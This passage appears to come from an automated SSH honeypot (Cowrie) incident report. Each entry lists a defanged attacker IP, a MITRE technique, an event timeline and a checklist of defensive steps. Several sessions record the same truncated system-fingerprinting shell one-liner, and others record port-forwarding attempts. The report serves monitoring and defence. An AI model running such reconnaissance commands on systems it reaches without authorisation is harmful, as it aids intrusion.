| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:00:00` | `cowrie.session.connect` |
| `2026-07-10 11:00:01` | `cowrie.client.version` |
| `2026-07-10 11:00:01` | `cowrie.client.kex` |
| `2026-07-10 11:00:03` | `cowrie.login.success` |
| `2026-07-10 11:00:04` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:00:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.152[.]148` to AbuseIPDB if not already reported
- [ ] Block `49.124.152[.]148` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e1b186260aa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:00 |
| **Last Seen** | 2026-07-10 11:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:00:09` | `cowrie.session.connect` |
| `2026-07-10 11:00:09` | `cowrie.client.version` |
| `2026-07-10 11:00:09` | `cowrie.client.kex` |
| `2026-07-10 11:00:11` | `cowrie.login.success` |
| `2026-07-10 11:00:12` | `cowrie.session.params` |
| `2026-07-10 11:00:12` | `cowrie.command.input` |
| `2026-07-10 11:00:12` | `cowrie.command.input` |
| `2026-07-10 11:00:12` | `cowrie.command.input` |
| `2026-07-10 11:00:12` | `cowrie.command.input` |
| `2026-07-10 11:00:12` | `cowrie.command.input` |
| `2026-07-10 11:00:12` | `cowrie.command.success` |
| `2026-07-10 11:00:12` | `cowrie.command.input` |
| `2026-07-10 11:00:12` | `cowrie.command.input` |
| `2026-07-10 11:00:12` | `cowrie.command.input` |
| `2026-07-10 11:00:12` | `cowrie.command.input` |
| `2026-07-10 11:00:13` | `cowrie.log.closed` |
| `2026-07-10 11:00:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d49e1302ff7a

| Field | Detail |
|---|---|
| **Source IP** | `191.210.73[.]33` |
| **First Seen** | 2026-07-10 11:00 |
| **Last Seen** | 2026-07-10 11:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:00:09` | `cowrie.session.connect` |
| `2026-07-10 11:00:10` | `cowrie.client.version` |
| `2026-07-10 11:00:10` | `cowrie.client.kex` |
| `2026-07-10 11:00:11` | `cowrie.login.success` |
| `2026-07-10 11:00:12` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:00:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.210.73[.]33` to AbuseIPDB if not already reported
- [ ] Block `191.210.73[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ef5e9edc93c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 11:00 |
| **Last Seen** | 2026-07-10 11:00 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:00:20` | `cowrie.session.connect` |
| `2026-07-10 11:00:21` | `cowrie.client.version` |
| `2026-07-10 11:00:21` | `cowrie.client.kex` |
| `2026-07-10 11:00:27` | `cowrie.login.success` |
| `2026-07-10 11:00:30` | `cowrie.session.params` |
| `2026-07-10 11:00:30` | `cowrie.command.input` |
| `2026-07-10 11:00:33` | `cowrie.log.closed` |
| `2026-07-10 11:00:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7911e81aacfd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:01 |
| **Last Seen** | 2026-07-10 11:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:01:23` | `cowrie.session.connect` |
| `2026-07-10 11:01:23` | `cowrie.client.version` |
| `2026-07-10 11:01:23` | `cowrie.client.kex` |
| `2026-07-10 11:01:24` | `cowrie.login.success` |
| `2026-07-10 11:01:26` | `cowrie.session.params` |
| `2026-07-10 11:01:26` | `cowrie.command.input` |
| `2026-07-10 11:01:26` | `cowrie.command.input` |
| `2026-07-10 11:01:26` | `cowrie.command.input` |
| `2026-07-10 11:01:26` | `cowrie.command.input` |
| `2026-07-10 11:01:26` | `cowrie.command.input` |
| `2026-07-10 11:01:26` | `cowrie.command.success` |
| `2026-07-10 11:01:26` | `cowrie.command.input` |
| `2026-07-10 11:01:26` | `cowrie.command.input` |
| `2026-07-10 11:01:26` | `cowrie.command.input` |
| `2026-07-10 11:01:26` | `cowrie.command.input` |
| `2026-07-10 11:01:26` | `cowrie.log.closed` |
| `2026-07-10 11:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e27f9ce8650b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:02 |
| **Last Seen** | 2026-07-10 11:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:02:37` | `cowrie.session.connect` |
| `2026-07-10 11:02:37` | `cowrie.client.version` |
| `2026-07-10 11:02:37` | `cowrie.client.kex` |
| `2026-07-10 11:02:38` | `cowrie.login.success` |
| `2026-07-10 11:02:40` | `cowrie.session.params` |
| `2026-07-10 11:02:40` | `cowrie.command.input` |
| `2026-07-10 11:02:40` | `cowrie.command.input` |
| `2026-07-10 11:02:40` | `cowrie.command.input` |
| `2026-07-10 11:02:40` | `cowrie.command.input` |
| `2026-07-10 11:02:40` | `cowrie.command.input` |
| `2026-07-10 11:02:40` | `cowrie.command.success` |
| `2026-07-10 11:02:40` | `cowrie.command.input` |
| `2026-07-10 11:02:40` | `cowrie.command.input` |
| `2026-07-10 11:02:40` | `cowrie.command.input` |
| `2026-07-10 11:02:40` | `cowrie.command.input` |
| `2026-07-10 11:02:40` | `cowrie.log.closed` |
| `2026-07-10 11:02:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-464510784267

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:03 |
| **Last Seen** | 2026-07-10 11:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:03:50` | `cowrie.session.connect` |
| `2026-07-10 11:03:50` | `cowrie.client.version` |
| `2026-07-10 11:03:50` | `cowrie.client.kex` |
| `2026-07-10 11:03:51` | `cowrie.login.success` |
| `2026-07-10 11:03:52` | `cowrie.session.params` |
| `2026-07-10 11:03:52` | `cowrie.command.input` |
| `2026-07-10 11:03:52` | `cowrie.command.input` |
| `2026-07-10 11:03:52` | `cowrie.command.input` |
| `2026-07-10 11:03:53` | `cowrie.command.input` |
| `2026-07-10 11:03:53` | `cowrie.command.input` |
| `2026-07-10 11:03:53` | `cowrie.command.success` |
| `2026-07-10 11:03:53` | `cowrie.command.input` |
| `2026-07-10 11:03:53` | `cowrie.command.input` |
| `2026-07-10 11:03:53` | `cowrie.command.input` |
| `2026-07-10 11:03:53` | `cowrie.command.input` |
| `2026-07-10 11:03:53` | `cowrie.log.closed` |
| `2026-07-10 11:03:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0862f3136237

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 11:04 |
| **Last Seen** | 2026-07-10 11:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:04:55` | `cowrie.session.connect` |
| `2026-07-10 11:04:55` | `cowrie.client.version` |
| `2026-07-10 11:04:55` | `cowrie.client.kex` |
| `2026-07-10 11:04:56` | `cowrie.login.success` |
| `2026-07-10 11:04:56` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:04:56` | `cowrie.direct-tcpip.data` |
| `2026-07-10 11:04:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fb7105de239

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:05 |
| **Last Seen** | 2026-07-10 11:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:05:03` | `cowrie.session.connect` |
| `2026-07-10 11:05:03` | `cowrie.client.version` |
| `2026-07-10 11:05:03` | `cowrie.client.kex` |
| `2026-07-10 11:05:04` | `cowrie.login.success` |
| `2026-07-10 11:05:05` | `cowrie.session.params` |
| `2026-07-10 11:05:05` | `cowrie.command.input` |
| `2026-07-10 11:05:05` | `cowrie.command.input` |
| `2026-07-10 11:05:05` | `cowrie.command.input` |
| `2026-07-10 11:05:05` | `cowrie.command.input` |
| `2026-07-10 11:05:05` | `cowrie.command.input` |
| `2026-07-10 11:05:05` | `cowrie.command.success` |
| `2026-07-10 11:05:05` | `cowrie.command.input` |
| `2026-07-10 11:05:05` | `cowrie.command.input` |
| `2026-07-10 11:05:05` | `cowrie.command.input` |
| `2026-07-10 11:05:05` | `cowrie.command.input` |
| `2026-07-10 11:05:06` | `cowrie.log.closed` |
| `2026-07-10 11:05:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2df8b5910ba

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:06 |
| **Last Seen** | 2026-07-10 11:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:06:14` | `cowrie.session.connect` |
| `2026-07-10 11:06:15` | `cowrie.client.version` |
| `2026-07-10 11:06:15` | `cowrie.client.kex` |
| `2026-07-10 11:06:16` | `cowrie.login.success` |
| `2026-07-10 11:06:18` | `cowrie.session.params` |
| `2026-07-10 11:06:18` | `cowrie.command.input` |
| `2026-07-10 11:06:18` | `cowrie.command.input` |
| `2026-07-10 11:06:18` | `cowrie.command.input` |
| `2026-07-10 11:06:18` | `cowrie.command.input` |
| `2026-07-10 11:06:18` | `cowrie.command.input` |
| `2026-07-10 11:06:18` | `cowrie.command.success` |
| `2026-07-10 11:06:18` | `cowrie.command.input` |
| `2026-07-10 11:06:18` | `cowrie.command.input` |
| `2026-07-10 11:06:18` | `cowrie.command.input` |
| `2026-07-10 11:06:18` | `cowrie.command.input` |
| `2026-07-10 11:06:18` | `cowrie.log.closed` |
| `2026-07-10 11:06:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83fe2eda84b2

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-10 11:07 |
| **Last Seen** | 2026-07-10 11:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:07:14` | `cowrie.session.connect` |
| `2026-07-10 11:07:14` | `cowrie.client.version` |
| `2026-07-10 11:07:14` | `cowrie.client.kex` |
| `2026-07-10 11:07:15` | `cowrie.login.success` |
| `2026-07-10 11:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5f4dda918a1

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-10 11:07 |
| **Last Seen** | 2026-07-10 11:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:07:15` | `cowrie.session.connect` |
| `2026-07-10 11:07:15` | `cowrie.client.version` |
| `2026-07-10 11:07:15` | `cowrie.client.kex` |
| `2026-07-10 11:07:15` | `cowrie.login.success` |
| `2026-07-10 11:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30ecefd8111e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-10 11:07 |
| **Last Seen** | 2026-07-10 11:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:07:15` | `cowrie.session.connect` |
| `2026-07-10 11:07:15` | `cowrie.client.version` |
| `2026-07-10 11:07:15` | `cowrie.client.kex` |
| `2026-07-10 11:07:15` | `cowrie.login.success` |
| `2026-07-10 11:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-344dfa2cd824

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-10 11:07 |
| **Last Seen** | 2026-07-10 11:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:07:25` | `cowrie.session.connect` |
| `2026-07-10 11:07:25` | `cowrie.client.version` |
| `2026-07-10 11:07:25` | `cowrie.client.kex` |
| `2026-07-10 11:07:25` | `cowrie.login.success` |
| `2026-07-10 11:07:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89251051e821

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:07 |
| **Last Seen** | 2026-07-10 11:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:07:28` | `cowrie.session.connect` |
| `2026-07-10 11:07:28` | `cowrie.client.version` |
| `2026-07-10 11:07:28` | `cowrie.client.kex` |
| `2026-07-10 11:07:30` | `cowrie.login.success` |
| `2026-07-10 11:07:31` | `cowrie.session.params` |
| `2026-07-10 11:07:31` | `cowrie.command.input` |
| `2026-07-10 11:07:31` | `cowrie.command.input` |
| `2026-07-10 11:07:31` | `cowrie.command.input` |
| `2026-07-10 11:07:31` | `cowrie.command.input` |
| `2026-07-10 11:07:31` | `cowrie.command.input` |
| `2026-07-10 11:07:31` | `cowrie.command.success` |
| `2026-07-10 11:07:31` | `cowrie.command.input` |
| `2026-07-10 11:07:31` | `cowrie.command.input` |
| `2026-07-10 11:07:31` | `cowrie.command.input` |
| `2026-07-10 11:07:31` | `cowrie.command.input` |
| `2026-07-10 11:07:31` | `cowrie.log.closed` |
| `2026-07-10 11:07:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a0446039d11

| Field | Detail |
|---|---|
| **Source IP** | `219.128.15[.]190` |
| **First Seen** | 2026-07-10 11:08 |
| **Last Seen** | 2026-07-10 11:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:08:24` | `cowrie.session.connect` |
| `2026-07-10 11:08:25` | `cowrie.client.version` |
| `2026-07-10 11:08:25` | `cowrie.client.kex` |
| `2026-07-10 11:08:28` | `cowrie.login.success` |
| `2026-07-10 11:08:28` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:08:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.128.15[.]190` to AbuseIPDB if not already reported
- [ ] Block `219.128.15[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e00021164b88

| Field | Detail |
|---|---|
| **Source IP** | `117.247.239[.]202` |
| **First Seen** | 2026-07-10 11:08 |
| **Last Seen** | 2026-07-10 11:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:08:38` | `cowrie.session.connect` |
| `2026-07-10 11:08:39` | `cowrie.client.version` |
| `2026-07-10 11:08:39` | `cowrie.client.kex` |
| `2026-07-10 11:08:41` | `cowrie.login.success` |
| `2026-07-10 11:08:42` | `cowrie.direct-tcpip.request` |
| `2026-07-10 11:08:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.247.239[.]202` to AbuseIPDB if not already reported
- [ ] Block `117.247.239[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b65f2f490a7d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 11:08 |
| **Last Seen** | 2026-07-10 11:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 11:08:40` | `cowrie.session.connect` |
| `2026-07-10 11:08:41` | `cowrie.client.version` |
| `2026-07-10 11:08:41` | `cowrie.client.kex` |
| `2026-07-10 11:08:42` | `cowrie.login.success` |
| `2026-07-10 11:08:43` | `cowrie.session.params` |
| `2026-07-10 11:08:43` | `cowrie.command.input` |
| `2026-07-10 11:08:43` | `cowrie.command.input` |
| `2026-07-10 11:08:43` | `cowrie.command.input` |
| `2026-07-10 11:08:43` | `cowrie.command.input` |
| `2026-07-10 11:08:43` | `cowrie.command.input` |
| `2026-07-10 11:08:43` | `cowrie.command.success` |
| `2026-07-10 11:08:43` | `cowrie.command.input` |
| `2026-07-10 11:08:43` | `cowrie.command.input` |
| `2026-07-10 11:08:43` | `cowrie.command.input` |
| `2026-07-10 11:08:43` | `cowrie.command.input` |
| `2026-07-10 11:08:43` | `cowrie.log.closed` |
| `2026-07-10 11:08:44` | `cowrie.session.closed` |

